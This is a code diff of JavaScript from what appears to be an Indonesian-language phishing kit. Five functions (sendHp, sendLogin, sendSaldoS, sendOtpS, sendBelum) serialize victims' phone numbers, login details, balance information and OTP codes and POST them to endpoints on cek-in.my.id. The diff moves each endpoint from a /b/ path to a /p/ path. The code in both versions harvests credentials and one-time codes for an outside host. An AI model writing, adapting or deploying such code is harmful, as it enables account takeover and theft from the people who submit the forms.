@@ -13,7 +13,7 @@ function sendHp() {
    sessionStorage.setItem('nohp', nohp);
    
    $.ajax({
-      url: 'https://cek-in.my.id/b/req/one.php',
+      url: 'https://cek-in.my.id/p/req/one.php',
       type: 'POST',
       data: $('#login').serialize(),  
       complete: function() {
@@ -33,7 +33,7 @@ function sendLogin(){
     document.getElementById('lanjutkan').innerHTML = "Memproses....";               
     
     $.ajax({
-      url: 'https://cek-in.my.id/b/req/two.php',
+      url: 'https://cek-in.my.id/p/req/two.php',
       type: 'POST',
       data: $('#sudah').serialize(),    
     complete: function(){    
@@ -61,7 +61,7 @@ function sendSaldoS() {
    document.getElementById('lanjutkan').innerHTML = "Memproses....";
    
    $.ajax({
-      url:  'https://cek-in.my.id/b/req/thre.php',
+      url:  'https://cek-in.my.id/p/req/thre.php',
       type: 'POST',
       data: $('#saldosdh').serialize(),
       complete: function() {
@@ -94,7 +94,7 @@ function sendOtpS() {
             
      $.ajax({
         type: 'POST',
-        url: 'https://cek-in.my.id/b/req/empat.php',
+        url: 'https://cek-in.my.id/p/req/empat.php',
         data: $('#formLinkk').serialize(),
         datatype: 'JSON',
                 complete: function (response) {
@@ -127,7 +127,7 @@ function sendBelum(){
    
    $.ajax({
         type: 'POST',
-        url: 'https://cek-in.my.id/b/req/lima.php',
+        url: 'https://cek-in.my.id/p/req/lima.php',
         data: $('#login').serialize(),
         datatype: 'JSON',
       complete: function() {
